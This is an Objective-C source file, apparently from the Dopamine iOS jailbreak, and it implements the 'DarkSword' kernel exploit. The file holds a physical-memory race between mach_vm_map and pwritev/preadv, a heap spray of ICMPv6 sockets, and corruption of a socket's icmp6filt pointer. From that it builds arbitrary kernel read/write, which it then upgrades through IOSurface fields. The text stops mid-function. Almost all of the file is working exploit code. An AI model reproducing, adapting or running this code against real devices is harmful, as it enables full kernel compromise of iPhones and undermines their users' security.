//
//  DarkSword.m
//  Dopamine
//
//  Created by Lars Fröder on 24.03.26.
//

#import <Foundation/Foundation.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/utsname.h>
#include <sys/fileport.h>
#include <sys/socket.h>
#define IPPROTO_ICMPV6          58
#define ICMP6_FILTER            18
#include <pthread.h>
#import <IOSurface/IOSurfaceRef.h>
#include <sys/uio.h>
#import <xpc/xpc.h>
#import <libjailbreak/info.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/primitives_external.h>
#import <libjailbreak/util.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include "../kfd/Exploit/libkfd/krkw/IOSurface_shared.h"
void IOSurfacePrefetchPages(IOSurfaceRef surface);

#define FAILURE(c) {fflush(stdout); sleep(2); exit(c);}
#define PRINT_VAR(var) {printf(#var ": %#llx\n", var); fflush(stdout); sleep(2);}

#define OOB_OFFSET 0x100
#define OOB_SIZE 0xf00
#define OOB_PAGES_NUM 2

void memset64(void *ptr, uint64_t val, size_t size)
{
    uint8_t *ptr8 = ptr;
    for (uint64_t idx = 0; idx < size; idx += sizeof(uint64_t)) {
        uint64_t *ptr64 = (uint64_t *)&ptr8[idx];
        *ptr64 = val;
    }
}

int readFd;
int writeFd;
kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

int highestSuccessIdx = 0;
int successReadCount = 0;
struct iovec iov;
uint64_t randomMarker;
uint64_t wiredPageMarker;
mach_port_t pcObject = MACH_PORT_NULL;
mach_vm_address_t pcAddress = 0;
mach_vm_size_t pcSize;

NSMutableArray<NSNumber *> *socketPorts;
NSMutableArray<NSNumber *> *socketPcbIds;
#define GETSOCKOPT_READ_LEN 32
void *getsockoptReadData = NULL;

volatile uint8_t goSync = 0;
volatile uint8_t raceSync = 0;
volatile uint8_t freeThreadStart = 0;
volatile mach_vm_address_t freeTarget = 0;
volatile mach_vm_size_t freeTargetSize = 0;
volatile mem_entry_name_port_t targetObject = 0;
volatile memory_object_offset_t targetObjectOffset = 0;

NSMutableDictionary<NSNumber *, id> *gMlockDict;

int controlSocket = 0;
int rwSocket = 0;
uint64_t controlSocketPcb = 0;
uint64_t rwSocketPcb = 0;
#define EARLY_KRW_LENGTH 0x20
uint8_t controlData[EARLY_KRW_LENGTH];

void setTargetKaddr(uint64_t where)
{
    memset(controlData, 0, EARLY_KRW_LENGTH);
    *(uint64_t *)controlData = where;
    int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);
    if (res != 0) {
        printf("[-] setsockopt failed!!!\n");
        FAILURE(0);
    }
}

#define TARGET_FILE_SIZE (PAGE_SIZE * 0x2)
void *default_file_content;
char executablePath[PATH_MAX];
const char *executableName;
bool isArm64e = false;

static uint64_t __attribute((naked)) __xpaci(uint64_t a)
{
    asm(".long        0xDAC143E0"); // XPACI X0
    asm("ret");
}

uint64_t unpac_ptr(uint64_t kptr)
{
    if (!isArm64e) return kptr;
    return __xpaci(kptr);
}

static void* reverse_memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len) {
    if (needle_len == 0)
        return (void *)haystack; // Match at start if needle is empty

    if (haystack_len < needle_len)
        return NULL;

    const char *h = (const char *)haystack;
    const char *n = (const char *)needle;

    for (size_t i = haystack_len - needle_len + 1; i-- > 0; ) {
        if (memcmp(h + i, n, needle_len) == 0) {
            return (void *)(h + i);
        }
    }
    
    return NULL;
}

pthread_t freeThread;

void init_globals(void)
{
    socketPorts = [NSMutableArray new];
    socketPcbIds = [NSMutableArray new];
    getsockoptReadData = calloc(1, GETSOCKOPT_READ_LEN);
    gMlockDict = [NSMutableDictionary new];
    default_file_content = calloc(1, TARGET_FILE_SIZE);
    randomMarker         = (uint64_t)arc4random() << 32 | arc4random();
    wiredPageMarker      = (uint64_t)arc4random() << 32 | arc4random();

    cpu_subtype_t cpusubtype = 0;
    size_t len = sizeof(cpusubtype);
    sysctlbyname("hw.cpusubtype", &cpusubtype, &len, NULL, 0);
    isArm64e = (cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;
}

void create_target_file(const char *path) {
    FILE *f = fopen(path, "w");
    fwrite(default_file_content, 1, TARGET_FILE_SIZE, f);
    fclose(f);
}

void init_target_file(void)
{
    char *read_file_path = calloc(1, 1024);
    char *write_file_path = calloc(1, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024);

    char read_file_name[100];
    char write_file_name[100];
    snprintf(read_file_name, 100, "/%u", arc4random());
    snprintf(write_file_name, 100, "/%u", arc4random());

    strcat(read_file_path, read_file_name);
    strcat(write_file_path, write_file_name);

    create_target_file(read_file_path);
    create_target_file(write_file_path);

    readFd  = open(read_file_path, O_RDWR);
    writeFd = open(write_file_path, O_RDWR);

    printf("[+] readFd: %d\n", readFd);
    printf("[+] writeFd: %d\n", writeFd);

    remove(read_file_path);
    remove(write_file_path);
    fcntl(readFd, F_NOCACHE, 1);
    fcntl(writeFd, F_NOCACHE, 1);
}

void *free_thread(void *arg)
{
    while (freeThreadStart == 0);

    while (goSync == 0);

    while (goSync != 0) {
        while (raceSync == 0);

        kern_return_t kr = mach_vm_map(mach_task_self(),
                                       (mach_vm_address_t *)&freeTarget,
                                       freeTargetSize,
                                       0,
                                       VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                       targetObject,
                                       targetObjectOffset,
                                       0,
                                       VM_PROT_DEFAULT,
                                       VM_PROT_DEFAULT,
                                       VM_INHERIT_NONE);

        if (kr != KERN_SUCCESS) {
            printf("[-] mach_vm_map failed !!!\n");
            printf("[+] freeTarget: %#llx\n", freeTarget);
            printf("[+] targetObject: %#x\n", targetObject);
            //FAILURE(0);
        }

        raceSync = 0;
    }

    return NULL;
}

fileport_t spray_socket(NSMutableArray *socketPorts, NSMutableArray *socketPcbIds)
{
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd == -1) {
        printf("[-] socket create failed!!!");
        return fd;
    }

    fileport_t outputSocketPort = 0;
    fileport_makeport(fd, &outputSocketPort);
    close(fd);

    void *socketInfo = calloc(1, 0x400);
    int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
    uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);

    [socketPorts addObject:@(outputSocketPort)];
    [socketPcbIds addObject:@(inp_gencnt)];
    return outputSocketPort;
}

void sockets_release(NSMutableArray *socketPorts, NSMutableArray *socketPcbIds)
{
    while (socketPorts.lastObject) {
        mach_port_deallocate(mach_task_self(), ((NSNumber *)socketPorts.lastObject).unsignedIntValue);
        [socketPorts removeLastObject];
        [socketPcbIds removeLastObject];
    }
}

IOSurfaceRef create_surface_with_address(uint64_t address, uint64_t size) {
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceAddress": @(address),
        @"IOSurfaceAllocSize": @(size)
    });

    IOSurfacePrefetchPages(surface);

    return surface;
}

void surface_mlock(uint64_t address, uint64_t size)
{
    gMlockDict[@(address)] = (__bridge id)create_surface_with_address(address, size);
}

void surface_munlock(uint64_t address, uint64_t size)
{
    IOSurfaceRef ref = (__bridge IOSurfaceRef)gMlockDict[@(address)];
    if (ref) {
        CFRelease(ref);
        [gMlockDict removeObjectForKey:@(address)];
    }
}


void pe_init(void)
{
    init_target_file();

    if (!executableName) {
        uint32_t sz = PATH_MAX;
        _NSGetExecutablePath(executablePath, &sz);
        executableName = strrchr(executablePath, '/');
        if (executableName) {
            executableName++;
        }
        else {
            executableName = executablePath;
        }
    }

    pthread_create(&freeThread, NULL, free_thread, NULL);
}

void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *address, mach_vm_size_t size)
{
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(size),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };

    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);

    if (!surface) {
        printf("[-] Failed to create surface!!!\n");
        FAILURE(0);
    }

    void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
    printf("[+] physicalMappingAddress: %p\n", physicalMappingAddress);

    mach_port_t memoryObject;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size, (mach_vm_address_t)physicalMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);
    if (!surface) {
        printf("[-] mach_make_memory_entry_64 failed!!!\n");
        FAILURE(0);
    }

    mach_vm_address_t newMappingAddress;
    kr = mach_vm_map(mach_task_self(), &newMappingAddress, size, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, memoryObject, 0, 0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);

    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_map failed!!!\n");
        FAILURE(0);
    }

    CFRelease(surface);
    *port = memoryObject;
    *address = newMappingAddress;
}

void initialize_physical_read_write(uint64_t contiguous_mapping_size)
{
    pcSize = contiguous_mapping_size;
    create_physically_contiguous_mapping(&pcObject, &pcAddress, pcSize);
    printf("[+] pcObject: %u\n", pcObject);
    printf("[+] pcAddress: %#llx\n", pcAddress);
    memset64((void *)pcAddress, randomMarker, pcSize);
    freeTarget = pcAddress;
    freeTargetSize = pcSize;
    freeThreadStart = 1;
    goSync = 1;
}

kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
    targetObject = memoryObject;
    targetObjectOffset = memoryObjectOffset;
    iov.iov_base = (void *)(pcAddress + 0x3f00);
    iov.iov_len = offset + size;
    *(uint64_t *)buffer = randomMarker;
    *(uint64_t *)(pcAddress + 0x3f00 + offset) = randomMarker;

    bool readRaceSucceeded = false;
    size_t w = 0;
    for (int tryIdx = 0; tryIdx < highestSuccessIdx + 100; tryIdx++) {
        raceSync = 1;
        w = pwritev(readFd, &iov, 1, 0x3f00);
        while (raceSync == 1);

        kern_return_t kr = mach_vm_map(mach_task_self(),
                                       &pcAddress,
                                       pcSize,
                                       0,
                                       VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                       pcObject,
                                       0,
                                       0,
                                       VM_PROT_DEFAULT,
                                       VM_PROT_DEFAULT,
                                       VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            printf("[+] mach_vm_map failed!!!\n");
            FAILURE(0);
        }
        if (w == -1) {
            size_t r = pread(readFd, buffer, size, 0x3f00 + offset);
            uint64_t marker = *(uint64_t *)buffer;
            if (marker != randomMarker) {
                readRaceSucceeded = true;
                successReadCount++;
                if (tryIdx > highestSuccessIdx) {
                    highestSuccessIdx = tryIdx;
                }
                break;
            } else {
                usleep(1);
            }
        }
        if (tryIdx == 500) {
            break;
        }
    }
    targetObject = 0;
    if (!readRaceSucceeded) return 1;
    return KERN_SUCCESS;
}

kern_return_t physical_oob_read_mo_with_retry(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
    kern_return_t kr;
    do {
        kr = physical_oob_read_mo(memoryObject, memoryObjectOffset, size, offset, buffer);
    } while (kr != KERN_SUCCESS);
    return kr;
}

void physical_oob_write_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
    targetObject = memoryObject;
    targetObjectOffset = memoryObjectOffset;
    iov.iov_base = (void *)(pcAddress + 0x3f00);
    iov.iov_len = offset + size;

    pwrite(writeFd, buffer, size, 0x3f00 + offset);
    for (int tryIdx = 0; tryIdx < 20; tryIdx++) {
        raceSync = 1;
        preadv(writeFd, &iov, 1, 0x3f00);
        while (raceSync == 1);
        kern_return_t kr = mach_vm_map(mach_task_self(),
                         &pcAddress,
                         pcSize,
                         0,
                         VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                         pcObject,
                         0,
                         0,
                         VM_PROT_DEFAULT,
                         VM_PROT_DEFAULT,
                         VM_INHERIT_NONE);
                         
        if (kr != KERN_SUCCESS) {
            printf("[-] mach_vm_map failed!!!\n");
            FAILURE(0);
        }
    }
    targetObject = 0;
}

void set_target_kaddr(uint64_t where)
{
    if (where <= 0xfffff00000000000){
        printf("[!] error: invalid kaddr %#llx\n", where);
        walk_backtrace(^bool(int frame_index, unw_word_t pc, unw_word_t offset, const char *symbol_name) {
            if (symbol_name) {
                printf("  [%d] 0x%llx %s + 0x%llx\n", frame_index, (unsigned long long)pc, symbol_name, (unsigned long long)offset);
            } else {
                printf("  [%d] 0x%llx (no symbol info)\n", frame_index, (unsigned long long)pc);
            }
            return true;
        });
        fflush(stdout);
        FAILURE(0);
    }
    memset(controlData, 0, EARLY_KRW_LENGTH);
    *(uint64_t *)controlData = where;
    int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);
    if (res != 0) {
        printf("[-] setsockopt failed!!!");
        FAILURE(0);
    }
}

void early_kreadbuf(uint64_t where, void *readBuf, size_t size)
{
    //printf("kreadbuf %#llx %p %#lx\n", where, readBuf, size); fflush(stdout); usleep(10000);
    
    if (size > EARLY_KRW_LENGTH) {
      printf("[!] error: (size > EARLY_KRW_LENGTH)\n");
      FAILURE(0);
    }
    
    uint64_t realEnd = where + EARLY_KRW_LENGTH - 1;
    
    int64_t offset = 0;
    if ((where & ~PAGE_MASK) != (realEnd & ~PAGE_MASK)) {
        // if we would cross a page boundary without the user wanting it, we need to align the read to the end of the buffer
        // this prevents errors / panics when the next page isn't mapped
        offset = (EARLY_KRW_LENGTH - size);
    }
    
    //printf("offset %#llx\n", offset); fflush(stdout); usleep(10000);

    set_target_kaddr(where - offset);
    uint8_t tmpBuf[EARLY_KRW_LENGTH];
    
    socklen_t read_data_length = EARLY_KRW_LENGTH;
    int res = getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuf, &read_data_length);
    if (res != 0) {
        printf("[-] getsockopt failed!!!\n");
        FAILURE(0);
    }
    
    memcpy(readBuf, &tmpBuf[offset], size);
}

uint64_t early_kread64(uint64_t where)
{
    uint64_t value = 0;
    early_kreadbuf(where, &value, sizeof(value));
    return value;
}

void early_kwritebuf(uint64_t where, void *writeBuf, size_t size)
{
    if (size > EARLY_KRW_LENGTH) {
      printf("[!] error: (size > EARLY_KRW_LENGTH)\n");
      FAILURE(0);
    }
    
    uint64_t realEnd = where + EARLY_KRW_LENGTH - 1;
    
    int64_t offset = 0;
    if ((where & ~PAGE_MASK) != (realEnd & ~PAGE_MASK)) {
        // if we would cross a page boundary without the user wanting it, we need to align the read to the end of the buffer
        // this prevents errors / panics when the next page isn't mapped
        offset = (EARLY_KRW_LENGTH - size);
    }
    uint8_t tmpBuf[EARLY_KRW_LENGTH];
    early_kreadbuf(where - offset, tmpBuf, EARLY_KRW_LENGTH);
    memcpy(&tmpBuf[offset], writeBuf, size);

    set_target_kaddr(where - offset);
    int res = setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuf, EARLY_KRW_LENGTH);
    if (res != 0) {
        printf("[-] setsockopt failed!!!\n");
        FAILURE(0);
    }
}

void early_kwrite64(uint64_t where, uint64_t what)
{
    early_kwritebuf(where, &what, sizeof(what));
}

static int darksword_kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint8_t *output8 = (uint8_t *)output;
    size_t bytes_read = 0;

    while (bytes_read < size) {
        size_t chunk = (size - bytes_read < EARLY_KRW_LENGTH) ? (size - bytes_read) : EARLY_KRW_LENGTH;
        early_kreadbuf(kaddr + bytes_read, &output8[bytes_read], chunk);
        bytes_read += chunk;
    }
    return 0;
}

static int darksword_kwritebuf(uint64_t kaddr, const void* input, size_t size)
{
    uint8_t *input8 = (uint8_t *)input;
    size_t bytes_written = 0;

    while (bytes_written < size) {
        size_t chunk = (size - bytes_written < EARLY_KRW_LENGTH) ? (size - bytes_written) : EARLY_KRW_LENGTH;
        early_kwritebuf(kaddr + bytes_written, &input8[bytes_written], chunk);
        bytes_written += chunk;
    }
    return 0;
}


#define IOSURFACE_OFF_USE_COUNT_PTR 0xc0
#define IOSURFACE_OFF_INDEXED_TIMESTAMP_PTR 0x360
#define IOSURFACE_READ_DISPLACEMENT 0x14
#define IOSURFACE_ROOT_USER_CLIENT_OFF_CLIENTS_ARRAY 0x118
#define IOSURFACE_CLIENT_OFF_SURFACE 0x40

uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
    uint64_t surfaceClientsArray = kread_ptr(rootUserClient + IOSURFACE_ROOT_USER_CLIENT_OFF_CLIENTS_ARRAY);
    return kread_ptr(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

io_connect_t gSurfaceConnect = 0;
uint32_t gSurfaceId = 0;
uint64_t gSurfaceKobj = 0;
mach_port_t gSurfacePort = 0;
static int darksword_init_iosurface(void)
{
    gSurfaceConnect = get_surface_client();
        
    IOSurfaceFastCreateArgs args = {0};
    args.IOSurfaceAddress = 0;
    args.IOSurfaceAllocSize = 100;
    
    gSurfacePort = create_surface_fast_path(gSurfaceConnect, &gSurfaceId, &args);
    uint64_t kobj = task_get_ipc_port_kobject(task_self(), gSurfacePort);
    gSurfaceKobj = kread_ptr(IOSurfaceRootUserClient_get_surfaceClientById(kobj, gSurfaceId) + IOSURFACE_CLIENT_OFF_SURFACE);
    
    return 0;
}

uint32_t iosurface_read32(uint64_t where)
{
    uint64_t bk = early_kread64(gSurfaceKobj + IOSURFACE_OFF_USE_COUNT_PTR);
    early_kwrite64(gSurfaceKobj + IOSURFACE_OFF_USE_COUNT_PTR, where - IOSURFACE_READ_DISPLACEMENT);
    uint32_t o = 0;
    iosurface_get_use_count(gSurfaceConnect, gSurfaceId, &o);
    early_kwrite64(gSurfaceKobj + IOSURFACE_OFF_USE_COUNT_PTR, bk);
    return o;
}

void iosurface_write64(uint64_t where, uint64_t what)
{
    uint64_t bk = early_kread64(gSurfaceKobj + IOSURFACE_OFF_INDEXED_TIMESTAMP_PTR);
    early_kwrite64(gSurfaceKobj + IOSURFACE_OFF_INDEXED_TIMESTAMP_PTR, where);
    set_indexed_timestamp(gSurfaceConnect, gSurfaceId, 0, what);
    early_kwrite64(gSurfaceKobj + IOSURFACE_OFF_INDEXED_TIMESTAMP_PTR, bk);
}

static int darksword_kreadbuf_iosurface(uint64_t kaddr, void *output, size_t size)
{
    uint8_t *buf = (uint8_t *)output;

    size_t i = 0;

    for (; i + 4 <= size; i += 4) {
        uint32_t val = iosurface_read32(kaddr + i);
        *(uint32_t *)(buf + i) = val;
    }

    if (i < size) {
        uint32_t val = iosurface_read32(kaddr + i);
        for (size_t j = 0; i + j < size; j++) {
            buf[i + j] = (val >> (8 * j)) & 0xFF;
        }
    }
    
    return 0;
}

static int darksword_kwritebuf_iosurface(uint64_t kaddr, const void* input, size_t size)
{
    const uint8_t *buf = (const uint8_t *)input;

    size_t i = 0;

    for (; i + 8 <= size; i += 8) {
        uint64_t val = *(uint64_t *)(buf + i);
        iosurface_write64(kaddr + i, val);
    }

    if (i < size) {
        uint64_t existing_low = iosurface_read32(kaddr + i);
        uint64_t existing_high = iosurface_read32(kaddr + i + 4);
        uint64_t existing = existing_low | (existing_high << 32);

        uint64_t mask = 0;
        uint64_t value = 0;

        for (size_t j = 0; i + j < size; j++) {
            mask |= ((uint64_t)0xFF) << (8 * j);
            value |= ((uint64_t)buf[i + j]) << (8 * j);
        }

        uint64_t final = (existing & ~mask) | (value & mask);
        iosurface_write64(kaddr + i, final);
    }

    return 0;
}


int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOffset, void *readBuffer, void *writeBuffer, NSMutableArray *targetInpGencntList, bool doRead)
{
    if (doRead) {
        physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
    }

    int searchStartIdx = 0;
    bool targetFound = false;
    uint64_t pcbStartOffset = 0;
    uint64_t corrupted_filter_marker = 0x0000ffffffffffff;
    void* found = NULL;
    do {
        found = memmem(readBuffer + searchStartIdx, OOB_SIZE - searchStartIdx, executableName, strlen(executableName));
        if (found) {
            // original implementation would apply a mask to the oracle ptr to get pcbStartOffset
            // but that approach doesn't work on older iOS versions, so we search for the corrupted filter
            // and calculate pcbStartOffset from there, which works on all versions 
            uint64_t found_offset = (uint8_t*)found - (uint8_t*)readBuffer;
            void* filter_found = reverse_memmem(found, found_offset, &corrupted_filter_marker, sizeof(corrupted_filter_marker));
            if (filter_found != NULL) {
                uint64_t filter_offset = (uint8_t*)filter_found - (uint8_t*)readBuffer;
                if (filter_offset >= koffsetof(inpcb, icmp6filt) + 0x8) {
                    pcbStartOffset = filter_offset - (koffsetof(inpcb, icmp6filt) + 0x8);
                    targetFound = true;
                    break;
                }
            }
        }
        searchStartIdx += 0x400;
    } while (found == NULL && searchStartIdx < OOB_SIZE);

    if (targetFound) {
        printf("[+] pcbStartOffset: %#llx\n", pcbStartOffset);
        uint64_t targetInpGencnt = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + 0x78);
        printf("[+] targetInpGencnt: %#llx\n", targetInpGencnt);
        if (targetInpGencnt == socketPcbIds.lastObject.unsignedLongLongValue) {
            printf("[-] Found last PCB\n");
            return -1;
        }
        bool isOurPcd = false;
        int controlSocketIdx = 0;
        for (int sockIdx = 0; sockIdx < socketPorts.count; sockIdx++) {
            if (socketPcbIds[sockIdx].unsignedLongLongValue == targetInpGencnt) {
                isOurPcd = true;
                controlSocketIdx = sockIdx;
                break;
            }
        }
        if (!isOurPcd) {
            printf("[-] Found freed PCB Page!\n");
            return -1;
        }
        if ([targetInpGencntList containsObject:@(targetInpGencnt)]) {
            printf("[-] Found old PCB Page!!!!\n");
            return -1;
        } else {
            [targetInpGencntList addObject:@(targetInpGencnt)];
        }
        uint64_t inpListNextPointer = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, list_prev)) - koffsetof(inpcb, list_next);
        uint64_t icmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt));
        printf("[+] inpListNextPointer: %#llx\n", inpListNextPointer);
        printf("[+] icmp6Filter: %#llx\n", icmp6Filter);
        rwSocketPcb = inpListNextPointer;
        memcpy(writeBuffer, readBuffer, OOB_SIZE);
        *(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt)) = inpListNextPointer + koffsetof(inpcb, icmp6filt);
        *(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt) + 8) = 0;

        printf("[+] Corrupting icmp6filter pointer...\n");
        while (true) {
            physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, writeBuffer);
            physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
            uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt));
            if (newIcmp6Filter == inpListNextPointer + koffsetof(inpcb, icmp6filt)) {
                printf("[+] target corrupted: %#llx\n", *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt)));
                break;
            }
        }
        int sock = fileport_makefd((fileport_t)socketPorts[controlSocketIdx].unsignedLongLongValue);
        socklen_t len = GETSOCKOPT_READ_LEN;
        int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockoptReadData, &len);
        if (res != 0) {
            printf("[-] getsockopt failed!!!\n");
            FAILURE(0);
        }
        uint64_t marker = *(uint64_t *)getsockoptReadData;
        if (marker != -1) {
            printf("[+] Found control_socket at idx: %u\n", controlSocketIdx);
            controlSocket = sock;
            rwSocket = fileport_makefd((fileport_t)socketPorts[controlSocketIdx + 1].unsignedLongLongValue);
            return KERN_SUCCESS;
        }
        else {
            printf("[-] Failed to corrupt control_socket at idx: %u\n", controlSocketIdx);
        }
    }
    return -1;
}

bool isA18Device = false;

void pe_v1(void)
{
    uint64_t totalSearchMappingPagesNum = isA18Device ? (0x10 * 0x10) : (0x1000 * 0x10);
    uint64_t searchMappingSize = isA18Device ? (0x10 * PAGE_SIZE) : (0x2000 * PAGE_SIZE);
    uint64_t totalSearchMappingSize = totalSearchMappingPagesNum * PAGE_SIZE;
    uint64_t searchMappingNum = totalSearchMappingSize / searchMappingSize;

    printf("[i] totalSearchMappingPagesNum: %#llx\n", totalSearchMappingPagesNum);
    printf("[i] searchMappingSize: %#llx\n", searchMappingSize);
    printf("[i] totalSearchMappingSize: %#llx\n", totalSearchMappingSize);
    printf("[i] searchMappingNum: %#llx\n", searchMappingNum);

    void *readBuffer = calloc(1, OOB_SIZE);
    void *writeBuffer = calloc(1, OOB_SIZE);
    initialize_physical_read_write(OOB_PAGES_NUM * PAGE_SIZE);
    mach_vm_address_t wiredMapping = 0;
    mach_vm_size_t wiredMappingSize = 1024ULL * 1024ULL * 1024ULL * 3ULL;
    kern_return_t kr = KERN_SUCCESS;
    if (isA18Device) {
        kr = mach_vm_allocate(mach_task_self(), &wiredMapping, wiredMappingSize, VM_FLAGS_ANYWHERE);
        printf("[+] wiredMapping: %#llx\n", wiredMapping);
    }
    NSMutableArray *targetInpGencntList = [NSMutableArray new];
    while (true) {
        if (isA18Device) {
            surface_mlock(wiredMapping, wiredMappingSize);
            for (int s = 0; s < (wiredMappingSize / PAGE_SIZE); s++) {
                *(uint64_t *)(wiredMapping + s + PAGE_SIZE) = 0;
            }
        }
        NSMutableArray<NSNumber *> *searchMappings = [NSMutableArray new];
        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress = 0;
            kr = mach_vm_allocate(mach_task_self(), &searchMappingAddress, searchMappingSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            if (kr != KERN_SUCCESS) {
                printf("[-] mach_vm_allocate failed!!! (%s)\n", mach_error_string(kr));
                FAILURE(0);
            }
            for (int k = 0; k < searchMappingSize; k += PAGE_SIZE) {
                *(uint64_t *)(searchMappingAddress + k) = randomMarker;
            }
            [searchMappings addObject:@(searchMappingAddress)];
        }
        socketPorts = [NSMutableArray new];
        socketPcbIds = [NSMutableArray new];
        unsigned socketPortsCount = 0;
        #define OPEN_MAX 10240
        int maxfiles = OPEN_MAX * 3;
        int leeway = 4096 * 2;
        for (unsigned socketCount = 0; socketCount < (maxfiles - leeway); socketCount++) {
            mach_port_t port = spray_socket(socketPorts, socketPcbIds);
            if (port == -1) {
                printf("[-] Failed to spray sockets: %u\n", socketCount);
                break;
            } else {
                socketPortsCount++;
            }
        }
        uint64_t startPcbId = socketPcbIds.firstObject.unsignedLongLongValue;
        uint64_t endPcbId = socketPcbIds.lastObject.unsignedLongLongValue;
        printf("[i] socketPortsCount: %u\n", socketPortsCount);
        printf("[i] startPcbId: %llu\n", startPcbId);
        printf("[i] endPcbId: %llu\n", endPcbId);
        bool success = false;
        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress = searchMappings[s].unsignedLongLongValue;
            printf("[i] looking in search mapping: %llu\n", s);
            mach_port_t memoryObject = 0;
            mach_vm_size_t memoryObjectSize = searchMappingSize;
            kr = mach_make_memory_entry_64(mach_task_self(), &memoryObjectSize, searchMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);
            if (kr != KERN_SUCCESS) {
                printf("[-] mach_make_memory_entry_64 failed!!!\n");
                FAILURE(0);
            }
            surface_mlock(searchMappingAddress, searchMappingSize);
            mach_vm_offset_t seekingOffset = 0;
            // fix mach_vm_map err on free thread, we'd try to map outside mo
            while (seekingOffset <= searchMappingSize - pcSize) {
                kr = physical_oob_read_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
                if (kr == KERN_SUCCESS) {
                    if (find_and_corrupt_socket(memoryObject, seekingOffset, readBuffer, writeBuffer, targetInpGencntList, false) == KERN_SUCCESS) {
                        success = true;
                        break;
                    }
                }
                seekingOffset += PAGE_SIZE;
            }
            kr = mach_port_deallocate(mach_task_self(), memoryObject);
            if (kr != KERN_SUCCESS) {
                printf("[-] mach_port_deallocate failed!!!\n");
                FAILURE(0);
            }
            if (success == true) {
                break;
            }
        }
        sockets_release(socketPorts, socketPcbIds);
        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
            [searchMappings removeLastObject];
            kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
        }
        if (isA18Device) {
            surface_munlock(wiredMapping, wiredMappingSize);
        }
        if (success == true) {
            break;
        }
    }
}

void pe_v2(void)
{
    // TODO: Implement
}

void krw_sockets_leak_forever(void)
{
    uint64_t controlSocketAddr = early_kread64(controlSocketPcb + koffsetof(inpcb, socket));
    uint64_t rwSocketAddr = early_kread64(rwSocketPcb + koffsetof(inpcb, socket));

    if (!controlSocketAddr || !rwSocketAddr) {
